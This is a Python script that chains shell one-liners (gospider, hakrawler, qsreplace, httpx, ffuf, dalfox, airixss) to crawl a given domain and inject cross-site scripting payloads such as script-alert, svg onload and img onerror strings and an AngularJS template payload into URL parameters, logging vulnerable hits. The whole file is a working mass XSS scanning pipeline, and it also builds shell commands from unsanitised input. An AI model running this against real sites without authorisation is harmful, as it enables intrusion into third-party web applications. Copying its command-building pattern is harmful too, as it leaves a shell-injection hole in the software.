from os import system
import sys

msg = sys.argv[1]

system('curl -skL "https://{}" | grep \'type="hidden"\' | grep -Eo \'name="[^\"]+"\' | cut -d\'"\' -f2 | xargs -I@ sh -c \'if curl -skL https://{}/?@=testxss | grep -q "value=testxss"; then echo "reflection found from @ parameter"; fi\' | tee -a {}xss.txt'.format(msg, msg, msg))
system('cat {}.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor(\'alert(\\\\\\"foo\\\\\\")\')()}}" -mr "name={{this.constructor.constructor(\'alert(\\"foo\\")\')()}}" | tee -a {}xss.txt'.format(msg, msg))
system('cat {}.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" | tee -a {}xss.txt'.format(msg, msg))
system('cat {}.txt | httpx -silent | hakrawler -subs | grep "=" | qsreplace \'<svg onload=confirm(1)>\' | airixss -payload "confirm(1)" | egrep -v \'Not\' | tee -a {}xss.txt'.format(msg, msg))
system('cat {}.txt | awk \'{{print $3}}\'| httpx -silent | xargs -I@ sh -c \'python3 http://xsstrike.py -u @ --crawl\' | tee -a {}xss.txt'.format(msg, msg))
system('gospider -S {}.txt -t 3 -c 100 | tr " " "\\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace \'%22><svg%20onload=confirm(1);>\' | tee -a {}xss.txt'.format(msg, msg))
# system('cat {}urls.txt | dalfox pipe --multicast -o {}xss.txt'.format(msg, msg))
# system('cat {}urls.txt | gf xss | sed \'s/=.*/=/\' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > {}xss.txt'.format(msg, msg, msg, msg))
# system('rm -rf FILE.txt')
system('cat {}urls.txt | grep \'=\' | qsreplace \'"><script>alert(1)</script>\' | while read host; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done | tee -a {}xss.txt'.format(msg, msg))
# system('cat {}urls.txt | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d \'"\' -f2 | sort -u | dalfox pipe | tee -a {}xss.txt'.format(msg, msg))
system('cat {}urls.txt | grep \'=\' | qsreplace \'"><script>alert(1)</script>\' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m Vulnerable"; done | tee -a {}xss.txt'.format(msg, msg))
# system('cat {}urls.txt | grep "=" | sed \'s/=.*/=/\' | sed \'s/URL: //\' | sort -u | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht | tee -a {}xss.txt'.format(msg, msg))
# system('rm -rf testxss.txt')
# system('cat {}urls.txt | kxss | tee -a {}xss.txt'.format(msg, msg))
system('gospider -S {}urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk \'{{print $5}}\'| grep "=" | qsreplace -a | dalfox pipe | tee {}xss.txt'.format(msg, msg))
# system('cat {}urls.txt | gf xss | uro | httpx -silent | qsreplace \'<svg onload=confirm(1)>\' | airixss -payload "confirm(1)" | tee -a {}xss.txt'.format(msg, msg))
system('cat {}urls.txt | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep \'=\'  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>" | tee -a {}xss.txt'.format(msg, msg))
system('cat {}urls.txt | gf xss | uro | qsreplace \'<img src=x onerror=alert(1);>\' | freq | egrep -v \'Not\' | tee -a {}xss.txt'.format(msg, msg))
system('cat {}urls.txt | urldedupe -qs | bhedak \'<svg onload=confirm(1)>\' | airixss -payload "confirm(1)" | egrep -v \'Not\' | tee -a {}xss.txt'.format(msg, msg))
# system("xargs -a {}urls.txt -I@ bash -c 'python3 XSStrike/xsstrike.py -u @ --fuzzer' --log-file {}xss.txt".format(msg, msg))

system("sort {}xss.txt | uniq > {}xss_sorted.txt".format(msg, msg))
system("rm -rf {}xss.txt".format(msg))
system("mv {}xss_sorted.txt {}xss.txt".format(msg, msg))
system("rm -rf {}xss_sorted.txt".format(msg))

print(f"XSS vulnerabilities saved to: {msg}xss.txt")

# system(f"cat tee -a {msg}xss.txt | notify")
